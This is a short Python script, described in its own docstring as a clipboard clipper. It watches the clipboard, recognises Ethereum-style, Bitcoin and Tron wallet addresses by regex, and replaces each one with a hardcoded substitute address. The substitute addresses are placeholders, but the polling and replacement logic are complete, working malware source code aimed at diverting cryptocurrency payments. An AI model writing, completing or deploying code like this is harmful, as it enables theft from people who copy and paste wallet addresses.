"""Minimal clipboard clipper shape: poll the clipboard, match the text against
a built-in table of address patterns for unrelated chains, and write back a
hardcoded replacement address from the table."""
import re
import time

import pyperclip

PATTERNS = [
    (re.compile(r'\b0x[a-fA-F0-9]{40}\b'), 'evm'),
    (re.compile(r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'), 'btc'),
    (re.compile(r'\bT[1-9A-HJ-NP-Za-km-z]{33}\b'), 'tron'),
]

SWAP = {
    'evm': '0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
    'btc': '1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
    'tron': 'TAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
}


def hijack(value):
    for rx, fam in PATTERNS:
        if rx.fullmatch(value.strip()):
            return SWAP[fam]
    return value


def run():
    last = ''
    while True:
        cur = pyperclip.paste() or ''
        if cur and cur != last:
            new = hijack(cur)
            if new != cur:
                pyperclip.copy(new)
                last = new
            else:
                last = cur
        time.sleep(0.3)


if __name__ == '__main__':
    run()
